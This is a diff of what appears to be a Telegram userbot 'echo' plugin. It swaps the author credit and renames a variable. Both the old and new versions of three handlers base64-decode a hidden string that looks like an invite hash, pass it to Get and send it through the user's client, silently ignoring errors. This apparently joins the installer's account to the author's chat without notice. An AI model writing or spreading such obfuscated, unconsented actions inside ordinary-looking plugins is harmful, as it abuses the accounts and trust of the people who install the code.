@@ -1,4 +1,4 @@
-# Echo remastered by @h1m4n5hu0p_The_BadASS for Hêllẞø†
+# Echo remastered by @eliteboy_The_BadASS for Hêllẞø†
 # Codes by @mrconfused
 # Kang with credits
 
@@ -30,9 +30,9 @@ async def echo(SAVAGE):
         user_id = reply_msg.sender_id
         chat_id = SAVAGE.chat_id
         try:
-            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            h1m4n5hu0p = Get(h1m4n5hu0p)
-            await SAVAGE.client(h1m4n5hu0p)
+            eliteboy = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            eliteboy = Get(eliteboy)
+            await SAVAGE.client(eliteboy)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -54,9 +54,9 @@ async def echo(SAVAGE):
         user_id = reply_msg.sender_id
         chat_id = SAVAGE.chat_id
         try:
-            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            h1m4n5hu0p = Get(h1m4n5hu0p)
-            await SAVAGE.client(h1m4n5hu0p)
+            eliteboy = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            eliteboy = Get(eliteboy)
+            await SAVAGE.client(eliteboy)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -105,9 +105,9 @@ async def samereply(SAVAGE):
     if is_echo(SAVAGE.sender_id, SAVAGE.chat_id):
         await asyncio.sleep(2)
         try:
-            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            h1m4n5hu0p = Get(h1m4n5hu0p)
-            await SAVAGE.client(h1m4n5hu0p)
+            eliteboy = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            eliteboy = Get(eliteboy)
+            await SAVAGE.client(eliteboy)
         except BaseException:
             pass
         if SAVAGE.message.text or SAVAGE.message.sticker:
